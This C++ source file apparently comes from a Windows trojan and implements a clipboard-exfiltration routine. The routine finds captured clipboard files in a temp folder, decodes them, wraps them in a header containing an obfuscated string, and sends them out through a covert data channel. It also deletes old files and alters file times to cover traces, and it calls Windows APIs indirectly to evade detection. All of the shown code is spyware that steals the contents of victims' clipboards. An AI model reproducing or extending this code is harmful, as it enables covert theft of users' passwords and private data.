// lipboard.cpp: implementation of the Clipboard class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "lipboard.h"
#include "io.h"
#include <sys\\stat.h>
#include "WinApi.h"
#include "NdisSocket.h"
#include "mumaPublic.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
time_t	begtm, endtm;

#ifndef STA_WORKRUN
	#define STA_WORKRUN		1
#endif

#define		CDATATYPE			(UCHAR)15
#define		CSESSIONID			(USHORT)0x6789

#define FIX_CLIP		10

/************************************************************************/
/* 剪贴板处理                                                           */
void SendClipboardData()
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD len = PGetTempPathA(MAX_PATH, flgTempPath);
	if (--len > 0)
	{
		if (flgTempPath[len]=='\\')
			flgTempPath[len]=0;
	}
 	strcat(flgTempPath, "\\");
 	strcat(flgTempPath, GetTmpPrevFix(FIX_CLIP));
  
//////////////////////////////////////////////////////////////////////////
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char findstr[MAX_PATH];
	memset(findstr,0,MAX_PATH);
	int error = 0;
	time_t time1=time(0);
	sprintf(findstr,"%s\\*.a",flgTempPath);
	hFind = PFindFirstFileA(findstr, &FindFileData);

	time_t now = time(0);
	time_t tmpbegtm = begtm;
	time_t tmpendtm = endtm;
	if ((now < begtm) || (now > endtm))
	{
		begtm = now;
		endtm = begtm + 300;
	}

	if (hFind != INVALID_HANDLE_VALUE)
	{
		time_t now = time(0);
		do
		{	//判断目录属性
			char tmp[MAX_PATH];
			memset(tmp,0,MAX_PATH);
			sprintf(tmp,"%s\\%s",flgTempPath,FindFileData.cFileName);
			
			//arrFile.Add(tmp);
			struct stat fst;
			if (!stat(tmp, &fst))
			{
				DWORD flen = fst.st_size;
				if ((flen <= 0) || (flen > 60000000))
				{
					PDeleteFileA(tmp);
					continue;
				}
				if(abs(now-fst.st_ctime) > 2*24*60)	// 2天, 清
				{
					PDeleteFileA(tmp);
					continue;
				}


				if(now > fst.st_mtime)
				{
					IF_LOUD(DbgFat32Log("发现新剪贴板文件%s", tmp););
					char sbegtm[100];
					memset(sbegtm, 0, 100);
					char sendtm[100];
					memset(sendtm, 0, 100);
					// 由文件名拆出开始,结束时间
					// YYYYmmDDHHMM_YYYYmmDDHHMM.a
					if(strlen(FindFileData.cFileName) > 25)
					{
						memcpy(sbegtm, FindFileData.cFileName, 12);
						memcpy(sendtm, FindFileData.cFileName+13, 12);
					}
					else
					{
						struct tm* ptm = localtime(&begtm);
						if (ptm==NULL)
							continue ;
						strftime(sbegtm, 100, "%Y%m%d%H%M", ptm);
						ptm = localtime(&endtm);
						if (ptm==NULL)
							continue;
						strftime(sendtm, 100, "%Y%m%d%H%M", ptm);
					}

					char clpb[10] = {0};
					char *buffer = new char[flen+256];
					int hlen = sprintf(buffer, 
						"content-type: %s\r\nbegtm: %s\r\nendtm: %s\r\n"
						"content-length: %d\r\nackfile: %s\r\n\r\n",DepubStringA(clpb,10,"8dyX_kVo:"),
						sbegtm, sendtm, flen, tmp);
					FILE *fp=fopen(tmp, "rb");
					BOOL bSendOK = FALSE;
					if (fp)
					{
						fread(buffer+hlen, 1, flen, fp);
						Decode2(buffer+hlen, flen);
						fclose(fp);
						fp=NULL;
						// 发送数据
				
						bSendOK = SendData(buffer, hlen+flen, CDATATYPE, CSESSIONID);
					}
					delete[] buffer;

					if(bSendOK)
					{
						ModifyFileTime(tmp, 0, 5);
					}
				}
			}			
		}while(PFindNextFileA(hFind, &FindFileData));
		PFindClose(hFind);
	}

	return ;
}

